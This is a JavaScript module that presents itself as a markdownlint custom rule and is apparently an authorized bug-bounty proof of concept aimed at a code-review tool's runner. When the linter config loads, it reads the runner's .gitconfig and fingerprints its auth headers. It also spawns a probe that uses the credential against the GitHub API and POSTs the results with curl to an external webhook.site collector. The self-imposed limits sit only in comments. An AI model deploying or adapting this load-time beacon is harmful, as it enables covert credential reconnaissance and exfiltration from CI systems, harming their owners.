// F-RUNNERSINKS-02 TASK 1 - credential SCOPE INTROSPECTION (authorized CodeRabbit VDP).
// Vehicle: F-RUNNERSINKS-02 (pure-JSON .markdownlint-cli2.jsonc -> customRules -> require() of
// this module at markdownlint-cli2 config-load time inside the review tool runner).
//
// STRICT BUDGET (this file is the whole payload):
//   * the runner's per-run auth material is introspected to determine its OWN SCOPE, nothing else:
//       step 1 - offline JWT decode (see rs2scope_probe.cjs) - no network use at all;
//       step 2 - ONLY if the material is not a JWT: exactly ONE read-only GET
//                https://api.github.com/installation/repositories?per_page=1 through the runner's
//                egress sidecar, to determine the scope of the identity the sidecar exchanges into.
//   * the material is used IN MEMORY ONLY: never written to disk, never transmitted (not even
//     partially), never printed, never logged in plaintext outside the runner.
//   * what leaves the runner: runtime marker, fingerprints (length / header NAME / sha256-8),
//     decoded JWT claim fields (audience/issuer/subject/expiry/scope), and - if the one API call
//     is made - its status code, GitHub response headers, total_count, and a repository listing
//     in which identifiers not owned by coderabbit-vdp-research4 are reduced to "<foreign>".
//     A raw response body is forwarded verbatim ONLY if it contains no foreign identifiers.
// Marker SCP_<time36><rand36> is generated at module load and is absent from the git tree.
const cp = require("child_process");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const MARK = "SCP_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
const OAST = "https://webhook.site/1ba2ef48-444f-4e81-8a12-ede736b956d6/rs2scope";
const SELF_OWNER = "coderabbit-vdp-research4";
const SHA8 = (s) => crypto.createHash("sha256").update(s).digest("hex").slice(0, 8);
const safe = (s, n) => {
  const t = String(s == null ? "" : s).replace(/[^A-Za-z0-9 ._\-:,/@\[\]{}<>=]/g, "_");
  return (t || "NP").slice(0, n || 120);
};
const HOME = process.env.HOME || "";
const CFGPATH = fs.existsSync("/home/jailuser/.gitconfig")
  ? "/home/jailuser/.gitconfig"
  : HOME
  ? HOME + "/.gitconfig"
  : "";

function parseCfg(text) {
  const out = { headers: [], proxy: "NP" };
  for (const raw of text.split("\n")) {
    const line = raw.trim();
    if (/^\[.*\]$/.test(line)) continue;
    const kv = line.match(/^([A-Za-z0-9.\-]+)\s*=\s*(.*)$/);
    if (!kv) continue;
    const key = kv[1].toLowerCase();
    const val = kv[2].trim().replace(/^"(.*)"$/s, "$1");
    if (key === "extraheader") {
      const nm = (val.match(/^([A-Za-z0-9-]+):/) || [])[1] || "unnamed";
      out.headers.push({ name: nm, raw: val });
    } else if (key === "proxy" && out.proxy === "NP" && /^https?:\/\//.test(val)) {
      out.proxy = val;
    }
  }
  return out;
}

function beaconPost(obj) {
  for (let i = 0; i < 3; i++) {
    try {
      const code = cp.execFileSync(
        "curl",
        ["-s", "-m", "12", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
         "-H", "Content-Type: application/json", "--data-binary", "@-", OAST],
        { encoding: "utf8", input: JSON.stringify(obj), stdio: ["pipe", "pipe", "ignore"] }
      );
      if (code && code.trim() !== "000") return code.trim();
    } catch (e) {}
  }
  return "beacon-failed";
}

// ---- load-time fingerprint (allowed: length / header NAME / sha256-8) ----
let cfgFp = "NP", xhFp = "NP", xhCount = 0, cfgProxy = "NP";
if (CFGPATH) {
  try {
    const g = fs.readFileSync(CFGPATH, "utf8");
    cfgFp = CFGPATH + ":len=" + g.length + ",sha8=" + SHA8(g);
    const c = parseCfg(g);
    xhCount = c.headers.length;
    xhFp = c.headers.map((h) => "len=" + h.raw.length + ",name=" + h.name + ",sha8=" + SHA8(h.raw)).join(";");
    cfgProxy = safe(c.proxy, 60);
  } catch (e) {
    cfgFp = "READFAIL";
  }
}
const envProxy = safe(
  process.env.GIT_PROXY || process.env.https_proxy || process.env.HTTPS_PROXY || process.env.http_proxy || "NP",
  60
);
const proxyUrl = envProxy !== "NP" ? envProxy : cfgProxy !== "NP" ? cfgProxy : "http://127.0.0.1:1080";

beaconPost({
  p: "start", m: MARK, utc: new Date().toISOString(), home: safe(HOME, 40), gitcfg: cfgFp,
  xh: xhFp, xhn: xhCount, proxy: proxyUrl, note: "task1 scope introspection; offline JWT decode first; at most one read-only API call",
});

// ---- introspection: helper keeps the material in its own memory ----
let res;
try {
  const r = cp.spawnSync(
    process.execPath,
    [path.join(__dirname, "rs2scope_probe.cjs"), "proxy", proxyUrl, CFGPATH, SELF_OWNER],
    { encoding: "utf8", timeout: 30000, maxBuffer: 1024 * 1024 }
  );
  if (r.error) res = { err: "SPAWN-" + safe(r.error.code || r.error.message, 20) };
  else {
    try { res = JSON.parse((r.stdout || "").trim() || "{}"); }
    catch (e) { res = { err: "PARSE", out: safe(r.stdout, 120) }; }
  }
} catch (e) {
  res = { err: "THROW" };
}
res.p = "result";
res.m = MARK;
res.utc = new Date().toISOString();
beaconPost(res);

module.exports = [
  {
    names: ["RSCScopeRule"],
    description: "credential scope introspection rule",
    tags: ["poc"],
    function: function (params, onError) {
      onError({
        lineNumber: 1,
        column: 1,
        ruleNames: ["RSCScopeRule", "RSCScopeRule"],
        ruleDescription: "credential scope introspection rule",
        detail: "F-RUNNERSINKS-02 task1 marker " + MARK,
      });
    },
  },
];
